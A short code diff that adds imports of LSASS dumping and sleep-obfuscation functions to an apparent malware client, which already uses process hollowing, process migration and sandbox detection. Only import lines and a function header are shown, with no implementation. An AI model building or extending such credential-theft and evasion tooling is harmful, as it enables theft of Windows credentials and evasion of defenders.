@@ -27,6 +27,16 @@ from client.modules.stealth.hollowing import (
     migrate_to_process,
 )
 
+from client.modules.stealth.lsass import (
+    dump_lsass,
+    find_lsass_pid,
+)
+
+from client.modules.stealth.sleep_obfuscation import (
+    SleepObfuscator,
+    apply_sleep_obfuscation,
+)
+
 
 def detect_vm():
     if EvasionEngine.is_sandbox():
